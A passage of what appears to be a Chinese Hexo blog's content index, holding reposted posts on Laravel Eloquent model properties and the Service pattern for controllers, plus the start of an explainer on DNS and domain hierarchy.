class="string">'deleted_at'</span>];</span><br></pre></td></tr></table></figure><p>设置<code>dates</code> 的属性，默认是一个Carbon 对象。</p><h3 id="perPage"><a href="#perPage" class="headerlink" title="perPage"></a>perPage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 自定义每页显示数量（默认为15条）</span><br><span class="line"> *</span><br><span class="line"> * @var int</span><br><span class="line"> *&#x2F;</span><br><span class="line">protected $perPage &#x3D; 50;</span><br></pre></td></tr></table></figure><h3 id="touches"><a href="#touches" class="headerlink" title="touches"></a>touches</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 更新关联模型的 updated_at 字段</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $touches = [<span class="string">'post'</span>];</span><br></pre></td></tr></table></figure><h3 id="dispatchesEvents"><a href="#dispatchesEvents" class="headerlink" title="dispatchesEvents"></a>dispatchesEvents</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模型的事件映射</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> $dispatchesEvents = [</span><br><span class="line">    <span class="string">'saved'</span> =&gt; UserSaved::class,</span><br><span class="line">    <span class="string">'deleted'</span> =&gt; UserDeleted::class,</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h3 id="with"><a href="#with" class="headerlink" title="with"></a>with</h3><p>为关联模型默认添加『渴求式加载』，等效于使用查询构造器时，手动指定<code>with</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   *   </span></span><br><span class="line"><span class="comment">   * <span class="doctag">@var</span> string[] </span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">protected</span> $with = [</span><br><span class="line">      <span class="string">"topics"</span>,</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">topics</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hasMany(Topic::class);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://learnku.com/docs/laravel/8.x/eloquent/9406#e45381" target="_blank" rel="noopener">Eloquent ORM 快速入门</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『转载』如何使用Service 模式</title>
      <link href="/how-to-use-service-mode/"/>
      <url>/how-to-use-service-mode/</url>
      
        <content type="html"><![CDATA[<p>若将数据库逻辑都写在 <code>Controller</code> 里，会造成 <code>Controller</code> 代码的臃肿难以维护，基于 <code>SOLID</code> 原则，我们应该使用 <code>Service</code> 模式辅助 <code>Controller</code>，将相关的业务逻辑封装在不同的 <code>Service</code>，方便项目的后期维护。</p><a id="more"></a><h2 id="商业逻辑"><a href="#商业逻辑" class="headerlink" title="商业逻辑"></a>商业逻辑</h2><p>商业逻辑中，常见的如 :</p><ol><li>牵涉到外部行为 : 如发送Email，使用外部API…</li><li>使用PHP写的逻辑 : 如根据购买的件数，有不同的折扣。</li></ol><p>若将商业逻辑写在 controller，会造成 controller 肥大，日后难以维护。</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><h3 id="牵涉到外部的行为"><a href="#牵涉到外部的行为" class="headerlink" title="牵涉到外部的行为"></a>牵涉到外部的行为</h3><p>如 <code>发送Email</code>，常常会在 <code>Controller</code> 中直接调用 <code>Mail::queue()</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    \Mail::queue(<span class="string">'email.index'</span>, $request-&gt;all(), <span class="function"><span class="keyword">function</span> <span class="params">(Message $message)</span> </span>&#123;</span><br><span class="line">        $message-&gt;sender(env(<span class="string">'MAIL_USERNAME'</span>));</span><br><span class="line">        $message-&gt;subject(env(<span class="string">'MAIL_SUBJECT'</span>));</span><br><span class="line">        $message-&gt;to(env(<span class="string">'MAIL_TO_ADDR'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中大型的项目中，会有几个问题：</p><ol><li>将牵涉到外部行为的逻辑写在 Controller，造成 Controller 代码臃肿难以维护</li><li>违反 SOLID 的单一职责原则：外部行为不应该写在 Controller</li><li>Controller 直接相依于外部行为，使得我们无法对 Controller 做单元测试</li></ol><p>比较好的方式是使用 Service，使用的步骤如下：</p><ol><li>将外部行为注入到 Service</li><li>在 Service 使用外部行为</li><li>将 Service 注入到 Controlelr</li></ol><p><code>app\Services\EmailService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Mail</span>\<span class="title">Message</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Mail</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class EmailService</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Services</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EmailService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \Mail</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $mailer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将相依的 Mailer 注入到 EmailService</span></span><br><span class="line"><span class="comment">     * EmailService constructor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $mailer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(Mail $mailer)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailer = $mailer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 发送 Email的逻辑写在 send() 不是使用 Mail Facade，而是使用 $this-&gt;mailer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">(array $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailer-&gt;queue(<span class="string">'email.index'</span>,$request,<span class="function"><span class="keyword">function</span><span class="params">(Message $message)</span></span>&#123;</span><br><span class="line">            $message-&gt;sender(env(<span class="string">'MAIL_USERNAME'</span>));</span><br><span class="line">            $message-&gt;subject(env(<span class="string">'MAIL_SUBJECT'</span>));</span><br><span class="line">            $message-&gt;to(env(<span class="string">'MAIL_TO_ADDR'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>app\Controllers\UserController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">EmailService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Services\EmailService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $emailService;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">store</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;emailService-&gt;send($request-&gt;all());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从原本相依于 <code>Mail Facade</code> ，改成相依于注入的 <code>EmailService</code>。<br>改用这种写法有几个优点，如下：</p><ol><li>将外部行为写在 Service，解决了 Controller 代码臃肿的问题。</li><li>符合 SOLID 的单一职责原则： 外部行为写在　Service ，没写在 Controller。</li><li>符合 SOLID 的依赖反转原则：Controller 并非直接相依于 Service，而是将 Service 依赖注入进 Controller。</li></ol><h3 id="使用-PHP-写的逻辑"><a href="#使用-PHP-写的逻辑" class="headerlink" title="使用 PHP 写的逻辑"></a>使用 PHP 写的逻辑</h3><p>如根据用户购买数量，给予同步的折扣，可能我们会在 Controller 直接写 <code>if () { ... } else { ... }</code> 逻辑。</p><p><code>app\Controllers\UserController.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $number = $request-&gt;input(<span class="string">'number'</span>);</span><br><span class="line">    $price = <span class="number">500</span>;</span><br><span class="line">    $discount = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ($number == <span class="number">1</span>) &#123;</span><br><span class="line">        $discount = <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($number == <span class="number">2</span>) &#123;</span><br><span class="line">        $discount = <span class="number">0.9</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> ($number == <span class="number">3</span>) &#123;</span><br><span class="line">        $discount = <span class="number">0.8</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $discount = <span class="number">0.7</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $total = $price * $number * $discount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $total;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在中大型项目中，会有几个问题：</p><ol><li>将 PHP 写的业务逻辑直接写在 Controller ，造成 Controller 的代码臃肿难以维护</li><li>违反了 SOLID 的单一职责原则：业务逻辑不应该写在 Controller</li><li>违反了 SOLID 的单一职责原则：若未来想要改变折扣的写算法，都需要用到此 Method，也也就是说这个 Method 同时包含了计算折扣于计算加总的职责，因此违反了 SOLID 的单一职责原则</li><li>直接写在 Controller 的逻辑无法被其他 Controller 使用</li></ol><p><code>app\Services\OrderService.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Services</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class OrderService</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Services</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrderService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算折扣</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $number</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> float</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getDisCount</span><span class="params">($number)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($number) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1.0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.9</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.8</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.7</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 计算最后价格</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $number</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> $discount</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getTotal</span><span class="params">($number, $discount)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">500</span> * $number * $discount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Controller 中调用代码，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Services</span>\<span class="title">OrderService</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Http</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class UserController</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@package</span> App\Http\Controllers</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> \App\Services\EmailService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> $orderService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * UserController constructor.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \App\Services\OrderService $orderService</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(OrderService $orderService)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;orderService = $orderService;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> \Illuminate\Http\Request $request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">(Request $request)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $number = $request-&gt;input(<span class="string">'number'</span>);</span><br><span class="line">        $discount = <span class="keyword">$this</span>-&gt;orderService-&gt;getDisCount($number);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;orderService-&gt;getTotal($number, $discount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将原本的 <code>if () { .. } else { .. }</code> 逻辑改写成使用 <code>OrderService</code>，<code>Controller</code> 变得非常干净，也达成原来 <code>Controller</code><br>接受 <code>Http Request</code>，调用其他 <code>Class</code> 的责任。</p><p>改用这种写法的几个优点：</p><ol><li>将 PHP 写的业务逻辑写在　Service ，解决了 Controller 代码臃肿的问题</li><li>符合 SOLID 的单一职责原则： 业务逻辑写在 Service，没写在 Controller</li><li>符合 SOLID 的单一职责原则：计算折扣与计算加总分开在不同的 Method，且归属于 OrderService，而非 Controller</li><li>符合 SOLID 的依赖反转原则： Controller 并非直接相依于 Service，而是将 Service 依赖注入进 Controller</li><li>其他 Controller 也可以重复使用这段业务逻辑</li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>实际上会有很多 Service ，需要自行依照 <strong>SOLID</strong> 原则去判断是否该建立 Service</li><li>Service 使得业务逻辑从 Controller 中解放，不仅更容易维护、更容易拓展、更容易重复使用且更容易测试</li></ul><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a>原文链接</h2><ul><li><a href="https://oomusou.io/laravel/service/" target="_blank" rel="noopener">如何使用Service？</a></li><li><a href="https://blog.csdn.net/qq_24935119/article/details/89658281" target="_blank" rel="noopener">如何使用 Service 模式?</a></li><li><a href="https://github.com/oomusou/Laravel51ServiceExternal_demo" target="_blank" rel="noopener">项目地址</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Laravel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『转载』域名背后那些事</title>
      <link href="/those-things-behind-the-domain-name/"/>
      <url>/those-things-behind-the-domain-name/</url>
      
        <content type="html"><![CDATA[<p>互联网中的地址是数字的 IP 地址，例如<code>61.135.169.125</code>就是百度的官网地址之一，如果每次访问百度都需要输入 IP 的话，估计到今天互联网都还没有走出鸿蒙阶段。</p><a id="more"></a><p>在网络发展历史上，最开始确实就是直接使用 IP 地址来访问远程主机的。早期联网的每台计算机都是采用主机文件（即我们俗称的 hosts 文件）来进行地址配置和解析的，后来联网机器越来越多，主机文件的更新和同步就成了很大的问题。于是，1983 年保罗·莫卡派乔斯发明了域名解析服务和域名系统，在 1985 年 1 月 1 日，世界上第一个域名 <a href="http://nordu.net/" target="_blank" rel="noopener">nordu.net</a> 才被注册成功。</p><p>域名比 IP 地址更容易记忆，本质上只是为数字化的互联网资源提供了易于记忆的别名，就像在北京提起「故宫博物院」就都知道指的是「东城区景山前街 4 号」的那个大院子一样。如果把 IP 地址看成电话号码，那域名系统就是通讯录。我们在通讯录里保存了朋友和家人的信息，每次通过名字找到某人打电话的时候，通讯录就会查出与之关联的电话号码，然后拨号过去。我们可能记不下多少完整的电话号码，但是联系人的名字却是一定记得的。</p><p>既然「域名」只是一个别名，单凭这一个名字我们并不能访问到正确的地址，只有能将域名解析成实际的网络地址，网络访问才能成功。这种解析工作由专门的「域名系统」（Domain Name System，简称 DNS）完成，DNS 也是互联网的核心基础服务之一。</p><h2 id="域名解析是怎么完成的"><a href="#域名解析是怎么完成的" class="headerlink" title="域名解析是怎么完成的"></a>域名解析是怎么完成的</h2><p>DNS 解析的过程是什么样子的呢？在开始这个问题之前，我们先看一看域名的层次结构。</p><h3 id="域名的层级结构"><a href="#域名的层级结构" class="headerlink" title="域名的层级结构"></a>域名的层级结构</h3><p>在讨论域名的时候，我们经常听到有人说「顶级域名」、「一级域名」、「二级域名」等概念，域名级别究竟是怎么划分的呢？</p><ul><li>根域名。还是以百度为例，通过一些域名解析工具，我们可以看到百度官网域名显示为 <code>www.baidu.com.</code>，细心的人会注意到，这里最后有一个 <code>.</code>，这不是 bug，而是所有域名的尾部都有一个根域名。<code>www.baidu.com</code> 真正的域名是 <code>www.baidu.com.root</code>，简写为<code>www.baidu.com</code>.，又因为根域名 <code>.root</code>对于所有域名都是一样的，所以平时是省略的，最终就变成了我们常见的样子。</li><li>根域名的下一级叫做顶级域名（top-level domain，缩写为 TLD），也叫做一级域名，常见的如 <code>.com/</code>、<code>.net/</code>、<code>.org/</code>、<code>.cn/</code> 等等，他们就是顶级域名。</li><li>再下一级叫做二级域名（second-level domain，缩写为 SLD），比如 <code>baidu.com</code>。这是我们能够购买和注册的最高级域名。<br>次级域名之下，就是主机名（host），也可以称为三级域名，比如 <code>www.baidu.com</code>，由此往下，基本上 N 级域名就是在 N-1 级域名前追加一级。</li></ul><p>总结一下，常见的域名层级结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">主机名.次级域名.顶级域名.根域名</span><br><span class="line">www.baidu.com.root</span><br></pre></td></tr></table></figure><p>一般来说我们购买一个域名就是购买一个二级域名（SLD）的管理权（如 0x2beace.com），有了这个管理权我们就可以随意设置三级、四级域名了。</p><h3 id="域名解析的过程"><a href="#域名解析的过程" class="headerlink" title="域名解析的过程"></a>域名解析的过程</h3><p>与域名的分级结构对应，DNS 系统也是一个树状结构，不同级别的域名由不同的域名服务器来解析，整个过程是一个「层级式」的。</p><p>层级式域名解析体系的第一层就是根域名服务器，全世界 IPv4 根域名服务器只有 13 台（名字分别为 A 至 M），1 个为主根服务器在美国，其余 12 个均为辅根服务器，它们负责管理世界各国的域名信息。在根服务器下面是顶级域名服务器，即相关国家域名管理机构的数据库，如中国互联网络信息中心（CNNIC）。然后是再下一级的权威域名服务器和 ISP 的缓存服务器。</p><p>一个域名必须首先经过根数据库的解析后，才能转到顶级域名服务器进行解析，这一点与生活中问路的情形有几分相似。</p><p>假设北京市设立了一个专门的「道路咨询局」，里面设置了局长、部长、处长、科员好几个级别的公务员，不同的部门、科室、人员负责解答不同区域的道路问题。这里的人都有一个共同特点，信奉「好记性不如烂笔头」的哲理，喜欢将自己了解到的信息记录到笔记本上。但是有一点遗憾的是，他们写字用的墨水只有一种，叫「魔术墨水」，初写字迹浓厚，之后会慢慢变淡，1 小时之后则会完全消失。道路咨询局门口还有一个门卫大爷，所有的人要问路都需要通过他来传达和回复，市民并不能进入办公楼。</p><p>如果市民 A 